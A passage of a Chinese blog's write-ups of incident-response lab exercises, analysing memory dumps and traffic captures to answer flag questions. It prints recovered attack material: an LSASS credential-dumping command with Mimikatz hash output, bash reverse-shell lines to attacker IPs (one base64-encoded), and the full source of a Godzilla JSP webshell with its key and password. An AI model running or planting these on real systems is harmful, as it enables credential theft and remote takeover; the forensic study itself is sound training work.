</span></span><span style=display:flex><span>rundll32.exe 是 Windows 操作系统中的一个实用程序，允许用户通过命令行运行基于 DLL 的函数。攻击者可以利用这个合法的系统工具来执行恶意操作，例如调用特定 DLL 文件中的函数来执行恶意代码。
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>comsvcs.dll 和 MiniDump 函数
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>comsvcs.dll 是 Windows 系统中的一个 DLL 文件，包含与 COM+ 服务相关的功能。这个 DLL 文件中的 MiniDump 函数可以用来创建内存转储文件（memory dump），这些文件包含了系统内存的快照，可能包括敏感信息，如用户凭证。
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>攻击流程
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>调用 rundll32.exe 攻击者使用 rundll32.exe 来调用 comsvcs.dll 中的 MiniDump 函数。命令格式如下：
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rundll32.exe comsvcs.dll, MiniDump &lt;PID&gt; &lt;DUMP_FILE_PATH&gt; full
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;PID&gt; 是目标进程的进程 ID，例如 LSASS 的进程 ID。
</span></span><span style=display:flex><span>&lt;DUMP_FILE_PATH&gt; 是要生成的转储文件路径，例如 C:\Windows\Temp\lsass.dmp。
</span></span><span style=display:flex><span>生成 lsass.dmp 文件 这个命令会生成一个包含 LSASS 进程内存内容的转储文件，通常命名为 lsass.dmp。LSASS 进程管理着系统的用户凭证，因此这个转储文件可能包含敏感信息，如密码哈希。
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>使用 Mimikatz 读取凭证 攻击者随后使用 Mimikatz 等工具来读取和提取转储文件中的凭证。Mimikatz 是一个广泛使用的安全工具，可以从明。
</span></span><span style=display:flex><span>                        
</span></span><span style=display:flex><span>原文链接：https://blog.csdn.net/administratorlws/article/details/139946448
</span></span></code></pre></div><h2 id=q3-13>Q3</h2><p><img alt=2025-03-09160559 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09160559.png></p><p>先导出文件利用010去头改为dmp，然后使用mimikatz得到数据</p><pre tabindex=0><code>mimikatz # sekurlsa::minidump C:\Users\0raN9e\Desktop\a.dmp
Switch to MINIDUMP : &#39;C:\Users\0raN9e\Desktop\a.dmp&#39;

mimikatz # sekurlsa::logonpasswords
Opening : &#39;C:\Users\0raN9e\Desktop\a.dmp&#39; file for minidump...

Authentication Id : 0 ; 1183799 (00000000:00121037)
Session           : Interactive from 1
User Name         : win101
Domain            : VULNTARGET
Logon Server      : WIN-UH20PRD3EAO
Logon Time        : 2023/10/19 11:35:08
SID               : S-1-5-21-3374851086-947483859-3378876003-1103
        msv :
         [00000003] Primary
         * Username : win101
         * Domain   : VULNTARGET
         * NTLM     : 282d975e35846022476068ab5a3d72df
         * SHA1     : bc9ecca8d006d8152bd51db558221a0540c9d604
         * DPAPI    : 8d6103509e746ac0ed9641f7c21d7cf7
</code></pre><p><img alt=2025-03-09161013 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09161013.png></p><h1 id=第六章-流量特征分析-常见攻击事件-tomcat>第六章 流量特征分析-常见攻击事件 tomcat</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>1、在web服务器上发现的可疑活动,流量分析会显示很多请求,这表明存在恶意的扫描行为,通过分析扫描的行为后提交攻击者IP  flag格式：flag{ip}，如：flag{127.0.0.1}
</span></span><span style=display:flex><span>2、找到攻击者IP后请通过技术手段确定其所在地址 flag格式: flag{城市英文小写}
</span></span><span style=display:flex><span>3、哪一个端口提供对web服务器管理面板的访问？ flag格式：flag{2222}
</span></span><span style=display:flex><span>4、经过前面对攻击者行为的分析后,攻击者运用的工具是？ flag格式：flag{名称}
</span></span><span style=display:flex><span>5、攻击者拿到特定目录的线索后,想要通过暴力破解的方式登录,请通过分析流量找到攻击者登录成功的用户名和密码？ flag格式：flag{root-123}
</span></span><span style=display:flex><span>6、攻击者登录成功后,先要建立反弹shell,请分析流量提交恶意文件的名称？ flag格式：flag{114514.txt}
</span></span><span style=display:flex><span>7、攻击者想要维持提权成功后的登录,请分析流量后提交关键的信息？ flag提示,某种任务里的信息
</span></span></code></pre></div><h2 id=q1-14>Q1</h2><p>很多SYN的包nmap扫描就是SYN 所以得到ip（直接看爆红的流量包即可</p><pre tabindex=0><code>flag{14.0.0.120}
</code></pre><h2 id=q2-14>Q2</h2><p><img alt=2025-03-09162759 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09162759.png></p><pre tabindex=0><code>guangzhou
</code></pre><h2 id=q3-14>Q3</h2><p>wireshark过滤出http随便tcp追踪一下</p><pre tabindex=0><code>flag{8080}
</code></pre><h2 id=q4-13>Q4</h2><p><img alt=2025-03-09163152 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09163152.png></p><pre tabindex=0><code>flag{gobuster}
</code></pre><p>进行了目录的扫描</p><h2 id=q5-10>Q5</h2><p>（建议先看Q7,再看q6，最后再看这个）</p><p>写好q6之后还是这个这个图片，author那里base64解码</p><pre tabindex=0><code>YWRtaW46dG9tY2F0
admin:tomcat
</code></pre><pre tabindex=0><code>flag{admin-tomcat}
</code></pre><h2 id=q6-3>Q6</h2><p>由于先写好了Q7往回退，可以看到文件</p><p><img alt=2025-03-09164030 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09164030.png></p><pre tabindex=0><code>flag{JXQOZY.war}
</code></pre><h2 id=q7-2>Q7</h2><p>中间偶然翻到的</p><p><img alt=2025-03-09163815 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09163815.png></p><pre tabindex=0><code>flag{/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/14.0.0.120/443 0&gt;&amp;1&#39;}
</code></pre><h1 id=第六章-流量特征分析-小王公司收到的钓鱼邮件>第六章 流量特征分析-小王公司收到的钓鱼邮件</h1><h2 id=q1-15>Q1</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>下载数据包文件 hacker1.pacapng，分析恶意程序访问了内嵌 URL 获取了 zip 压缩包，该 URL 是什么将该 URL作为 FLAG 提交 FLAG（形式：flag{xxxx.co.xxxx/w0ks//?YO=xxxxxxx}） (无需 http、https)；
</span></span></code></pre></div><p>http过滤</p><pre tabindex=0><code>GET /w0ks//?YO=1702920835 HTTP/1.1
Host: tsdandassociates.co.sz
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://tsdandassociates.co.sz/w0ks/?92444881
Accept-Encoding: gzip, deflate
Accept-Language: en
</code></pre><pre tabindex=0><code>flag{tsdandassociates.co.sz/w0ks//?YO=1702920835}
</code></pre><h2 id=q2-15>Q2</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>下载数据包文件 hacker1.pacapng，分析获取到的 zip 压缩包的 MD5 是什么 作为 FLAG 提交 FLAG（形式：flag{md5}）；
</span></span></code></pre></div><p>可以看到上面的流量包下面就是pk开头的数据，导出改尾巴</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>──<span style=color:#f92672>(</span>orange㉿Coyano<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>/mnt/f/取证题<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─$ md5sum 1.zip
</span></span><span style=display:flex><span>f17dc5b1c30c512137e62993d1df9b2f  1.zip
</span></span></code></pre></div><h2 id=q3-15>Q3</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>下载数据包文件 hacker1.pacapng，分析 zip 压缩包通过加载其中的 javascript 文件到另一个域名下载后续恶意程序， 该域名是什么?提交答案:flag{域名}(无需 http、https)
</span></span></code></pre></div><p>解压是一个js里面大量的注释</p><p>全局搜索<code>"h"</code>,定位到</p><pre tabindex=0><code> o457607380+=&#39;h&#39;;
</code></pre><p>然后以下的进行拼接</p><pre tabindex=0><code>https://shakyastatuestrade.com/A6F/616231603 qui.q
</code></pre><pre tabindex=0><code>flag{shakyastatuestrade.com}
</code></pre><h1 id=第六章-流量特征分析-waf-上的截获的黑客攻击流量>第六章 流量特征分析-waf 上的截获的黑客攻击流量</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>应急响应工程师小徐在 waf 上下载了一段黑客的攻击流量，请你分析黑客的攻击流量，并且找到对应的关键信息提供给应急小组协助修复漏洞
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>1.黑客成功登录系统的密码 flag{xxxxxxxxxxxxxxx}
</span></span><span style=display:flex><span>2.黑客发现的关键字符串 flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
</span></span><span style=display:flex><span>3.黑客找到的数据库密码 flag{xxxxxxxxxxxxxxxx}
</span></span></code></pre></div><h2 id=q1-16>Q1</h2><pre tabindex=0><code>http.request.method == &#34;POST&#34;
</code></pre><p>按length从小到大，发现到这边</p><p><img alt=2025-03-09172823 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09172823.png></p><p>路由改变了，在这附近找密码，可以找到在长度为754的这条里面存在</p><pre tabindex=0><code>admin!@#pass123
</code></pre><h2 id=q2-16>Q2</h2><p><img alt=2025-03-09173203 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09173203.png></p><pre tabindex=0><code>      &lt;div class=&#34;warning&#34;&gt;欢迎来到后台，你的flag是：319fc83ee5304a6b4319ce1f9e4d9dc1&lt;/div&gt;\r\n
</code></pre><p>发现不对,继续往下翻</p><pre tabindex=0><code>flag:87b7cb79481f317bde90c116cf36084b\r\n
</code></pre><p><img alt=2025-03-09173315 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09173315.png></p><h2 id=q3-16>Q3</h2><p>搜索</p><p><code>http contains "dbpass"</code></p><pre tabindex=0><code>$dbpass   = &#34;e667jUPvJjXHvEUv&#34;;\n
</code></pre><h1 id=第六章-哥斯拉40流量分析>第六章-哥斯拉4.0流量分析</h1><h2 id=q1-17>Q1</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>1、黑客的IP是什么？
</span></span></code></pre></div><p>下载流量包，一共就两个ip</p><p>观察404的部分，得到</p><pre tabindex=0><code>flag{192.168.31.190}
</code></pre><h2 id=q2-17>Q2</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>2、黑客是通过什么漏洞进入服务器的？（提交CVE编号）
</span></span></code></pre></div><p>length按长度来，发现第一个有204的异常，跟踪一下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>&lt;%!</span> String xc<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1710acba6220f62b&#34;</span>; String pass<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;7f0e6f&#34;</span>; String md5<span style=color:#f92672>=</span>md5(pass<span style=color:#f92672>+</span>xc); <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>X</span> <span style=color:#66d9ef>extends</span> ClassLoader{<span style=color:#66d9ef>public</span> <span style=color:#a6e22e>X</span>(ClassLoader z){<span style=color:#66d9ef>super</span>(z);}<span style=color:#66d9ef>public</span> Class <span style=color:#a6e22e>Q</span>(<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> cb){<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>super</span>.<span style=color:#a6e22e>defineClass</span>(cb, 0, cb.<span style=color:#a6e22e>length</span>);} }<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> <span style=color:#a6e22e>x</span>(<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> s,<span style=color:#66d9ef>boolean</span> m){ <span style=color:#66d9ef>try</span>{javax.<span style=color:#a6e22e>crypto</span>.<span style=color:#a6e22e>Cipher</span> c<span style=color:#f92672>=</span>javax.<span style=color:#a6e22e>crypto</span>.<span style=color:#a6e22e>Cipher</span>.<span style=color:#a6e22e>getInstance</span>(<span style=color:#e6db74>&#34;AES&#34;</span>);c.<span style=color:#a6e22e>init</span>(m<span style=color:#f92672>?</span>1:2,<span style=color:#66d9ef>new</span> javax.<span style=color:#a6e22e>crypto</span>.<span style=color:#a6e22e>spec</span>.<span style=color:#a6e22e>SecretKeySpec</span>(xc.<span style=color:#a6e22e>getBytes</span>(),<span style=color:#e6db74>&#34;AES&#34;</span>));<span style=color:#66d9ef>return</span> c.<span style=color:#a6e22e>doFinal</span>(s); }<span style=color:#66d9ef>catch</span> (Exception e){<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>; }} <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>md5</span>(String s) {String ret <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;<span style=color:#66d9ef>try</span> {java.<span style=color:#a6e22e>security</span>.<span style=color:#a6e22e>MessageDigest</span> m;m <span style=color:#f92672>=</span> java.<span style=color:#a6e22e>security</span>.<span style=color:#a6e22e>MessageDigest</span>.<span style=color:#a6e22e>getInstance</span>(<span style=color:#e6db74>&#34;MD5&#34;</span>);m.<span style=color:#a6e22e>update</span>(s.<span style=color:#a6e22e>getBytes</span>(), 0, s.<span style=color:#a6e22e>length</span>());ret <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> java.<span style=color:#a6e22e>math</span>.<span style=color:#a6e22e>BigInteger</span>(1, m.<span style=color:#a6e22e>digest</span>()).<span style=color:#a6e22e>toString</span>(16).<span style=color:#a6e22e>toUpperCase</span>();} <span style=color:#66d9ef>catch</span> (Exception e) {}<span style=color:#66d9ef>return</span> ret; } <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>base64Encode</span>(<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bs) <span style=color:#66d9ef>throws</span> Exception {Class base64;String value <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;<span style=color:#66d9ef>try</span> {base64<span style=color:#f92672>=</span>Class.<span style=color:#a6e22e>forName</span>(<span style=color:#e6db74>&#34;java.util.Base64&#34;</span>);Object Encoder <span style=color:#f92672>=</span> base64.<span style=color:#a6e22e>getMethod</span>(<span style=color:#e6db74>&#34;getEncoder&#34;</span>, <span style=color:#66d9ef>null</span>).<span style=color:#a6e22e>invoke</span>(base64, <span style=color:#66d9ef>null</span>);value <span style=color:#f92672>=</span> (String)Encoder.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>getMethod</span>(<span style=color:#e6db74>&#34;encodeToString&#34;</span>, <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> { <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span> }).<span style=color:#a6e22e>invoke</span>(Encoder, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> { bs });} <span style=color:#66d9ef>catch</span> (Exception e) {<span style=color:#66d9ef>try</span> { base64<span style=color:#f92672>=</span>Class.<span style=color:#a6e22e>forName</span>(<span style=color:#e6db74>&#34;sun.misc.BASE64Encoder&#34;</span>); Object Encoder <span style=color:#f92672>=</span> base64.<span style=color:#a6e22e>newInstance</span>(); value <span style=color:#f92672>=</span> (String)Encoder.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>getMethod</span>(<span style=color:#e6db74>&#34;encode&#34;</span>, <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> { <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span> }).<span style=color:#a6e22e>invoke</span>(Encoder, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> { bs });} <span style=color:#66d9ef>catch</span> (Exception e2) {}}<span style=color:#66d9ef>return</span> value; } <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> <span style=color:#a6e22e>base64Decode</span>(String bs) <span style=color:#66d9ef>throws</span> Exception {Class base64;<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> value <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;<span style=color:#66d9ef>try</span> {base64<span style=color:#f92672>=</span>Class.<span style=color:#a6e22e>forName</span>(<span style=color:#e6db74>&#34;java.util.Base64&#34;</span>);Object decoder <span style=color:#f92672>=</span> base64.<span style=color:#a6e22e>getMethod</span>(<span style=color:#e6db74>&#34;getDecoder&#34;</span>, <span style=color:#66d9ef>null</span>).<span style=color:#a6e22e>invoke</span>(base64, <span style=color:#66d9ef>null</span>);value <span style=color:#f92672>=</span> (<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span>)decoder.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>getMethod</span>(<span style=color:#e6db74>&#34;decode&#34;</span>, <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> { String.<span style=color:#a6e22e>class</span> }).<span style=color:#a6e22e>invoke</span>(decoder, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> { bs });} <span style=color:#66d9ef>catch</span> (Exception e) {<span style=color:#66d9ef>try</span> { base64<span style=color:#f92672>=</span>Class.<span style=color:#a6e22e>forName</span>(<span style=color:#e6db74>&#34;sun.misc.BASE64Decoder&#34;</span>); Object decoder <span style=color:#f92672>=</span> base64.<span style=color:#a6e22e>newInstance</span>(); value <span style=color:#f92672>=</span> (<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span>)decoder.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>getMethod</span>(<span style=color:#e6db74>&#34;decodeBuffer&#34;</span>, <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> { String.<span style=color:#a6e22e>class</span> }).<span style=color:#a6e22e>invoke</span>(decoder, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> { bs });} <span style=color:#66d9ef>catch</span> (Exception e2) {}}<span style=color:#66d9ef>return</span> value; }<span style=color:#f92672>%&gt;&lt;%</span><span style=color:#66d9ef>try</span>{<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> data<span style=color:#f92672>=</span>base64Decode(request.<span style=color:#a6e22e>getParameter</span>(pass));data<span style=color:#f92672>=</span>x(data, <span style=color:#66d9ef>false</span>);<span style=color:#66d9ef>if</span> (session.<span style=color:#a6e22e>getAttribute</span>(<span style=color:#e6db74>&#34;payload&#34;</span>)<span style=color:#f92672>==</span><span style=color:#66d9ef>null</span>){session.<span style=color:#a6e22e>setAttribute</span>(<span style=color:#e6db74>&#34;payload&#34;</span>,<span style=color:#66d9ef>new</span> X(<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>getClassLoader</span>()).<span style=color:#a6e22e>Q</span>(data));}<span style=color:#66d9ef>else</span>{request.<span style=color:#a6e22e>setAttribute</span>(<span style=color:#e6db74>&#34;parameters&#34;</span>,data);java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>ByteArrayOutputStream</span> arrOut<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>ByteArrayOutputStream</span>();Object f<span style=color:#f92672>=</span>((Class)session.<span style=color:#a6e22e>getAttribute</span>(<span style=color:#e6db74>&#34;payload&#34;</span>)).<span style=color:#a6e22e>newInstance</span>();f.<span style=color:#a6e22e>equals</span>(arrOut);f.<span style=color:#a6e22e>equals</span>(pageContext);response.<span style=color:#a6e22e>getWriter</span>().<span style=color:#a6e22e>write</span>(md5.<span style=color:#a6e22e>substring</span>(0,16));f.<span style=color:#a6e22e>toString</span>();response.<span style=color:#a6e22e>getWriter</span>().<span style=color:#a6e22e>write</span>(base64Encode(x(arrOut.<span style=color:#a6e22e>toByteArray</span>(), <span style=color:#66d9ef>true</span>)));response.<span style=color:#a6e22e>getWriter</span>().<span style=color:#a6e22e>write</span>(md5.<span style=color:#a6e22e>substring</span>(16));} }<span style=color:#66d9ef>catch</span> (Exception e){}
</span></span><span style=display:flex><span><span style=color:#f92672>%&gt;</span>
</span></span></code></pre></div><p><a href=https://www.cnblogs.com/Junglezt/p/18123082>tomcat通过PUT方法任意文件写入(CVE-2017-12615)漏洞复现 - Junglezt - 博客园</a></p><p>搜索<code>tomcat put cve</code></p><pre tabindex=0><code>flag{CVE-2017-12615}
</code></pre><h2 id=q3-17>Q3</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>3、黑客上传的木马文件名是什么？(提交文件名)
</span></span></code></pre></div><pre tabindex=0><code>flag{hello.jsp}
</code></pre><pre tabindex=0><code>PUT /hello.jsp/ HTTP/1.1
Host: 192.168.31.168:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: JSESSIONID=BB06CCAD2D89AA0BACA30B2BBCE3F2CE
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 2619
</code></pre><p>和上面是同一个流量包</p><h2 id=q4-14>Q4</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>4、黑客上传的木马连接密码是什么？
</span></span></code></pre></div><pre tabindex=0><code>flag{7f0e6f}
</code></pre><p>和Q2一个流量包，pass对应的内容</p><h2 id=q5-11>Q5</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>5、黑客上传的木马解密密钥是什么？
</span></span></code></pre></div><p>同上，同一个流量包</p><pre tabindex=0><code>flag{1710acba6220f62b}
</code></pre><h2 id=q6-4>Q6</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>6、黑客连接webshell后执行的第一条命令是什么？
</span></span></code></pre></div><p><img alt=2025-03-09180735 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09180735.png></p><p>用工具，把对应数据填一下</p><p>再看一下回显</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>4.19.0-25-amd64
</span></span></code></pre></div><p>所以flag是</p><pre tabindex=0><code>flag{uname -r}
</code></pre><h2 id=q7-3>Q7</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>7、黑客连接webshell时查询当前shell的权限是什么？
</span></span></code></pre></div><p>在eq47里用工具解码一下回显</p><pre tabindex=0><code>uid=0(root) gid=0(root) groups=0(root)
</code></pre><p>所以是root权限</p><pre tabindex=0><code>flag{root}
</code></pre><h2 id=q8-1>Q8</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>8、黑客利用webshell执行命令查询服务器Linux系统发行版本是什么？
</span></span></code></pre></div><p>方法同上，eq48的回显</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>哥斯拉webshell返回包流量解密为:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PRETTY_NAME<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Debian GNU/Linux 10 (buster)&#34;</span>
</span></span><span style=display:flex><span>NAME<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Debian GNU/Linux&#34;</span>
</span></span><span style=display:flex><span>VERSION_ID<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;10&#34;</span>
</span></span><span style=display:flex><span>VERSION<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;10 (buster)&#34;</span>
</span></span><span style=display:flex><span>VERSION_CODENAME<span style=color:#f92672>=</span>buster
</span></span><span style=display:flex><span>ID<span style=color:#f92672>=</span>debian
</span></span><span style=display:flex><span>HOME_URL<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;https://www.debian.org/&#34;</span>
</span></span><span style=display:flex><span>SUPPORT_URL<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;https://www.debian.org/support&#34;</span>
</span></span><span style=display:flex><span>BUG_REPORT_URL<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;https://bugs.debian.org/&#34;</span>
</span></span></code></pre></div><pre tabindex=0><code>flag{Debian GNU/Linux 10 (buster)}
</code></pre><h2 id=q9>Q9</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>9、黑客利用webshell执行命令还查询并过滤了什么？（提交整条执行成功的命令）
</span></span></code></pre></div><p>下面一条流量回显是</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>哥斯拉webshell返回包流量解密为:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>2&gt;&amp;1: 1: 2&gt;&amp;1: rmp: not found
</span></span></code></pre></div><p>继续找后面的流量</p><pre tabindex=0><code>dpkg -l libpam-modules:amd64
</code></pre><pre tabindex=0><code>哥斯拉webshell返回包流量解密为:

Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                 Version      Architecture Description
+++-====================-============-============-========================================
ii  libpam-modules:amd64 1.3.1-5      amd64        Pluggable Authentication Modules for PAM
</code></pre><pre tabindex=0><code>flag{dpkg -l libpam-modules:amd64}
</code></pre><h2 id=q10>Q10</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>10、黑客留下后门的反连的IP和PORT是什么？（IP:PORT)
</span></span></code></pre></div><p><img alt=2025-03-09181845 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09181845.png></p><pre tabindex=0><code>L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==
192.168.31.143/1313
</code></pre><pre tabindex=0><code>flag{192.168.31.143:1313}
</code></pre><h2 id=q11>Q11</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>11、黑客通过什么文件留下了后门？
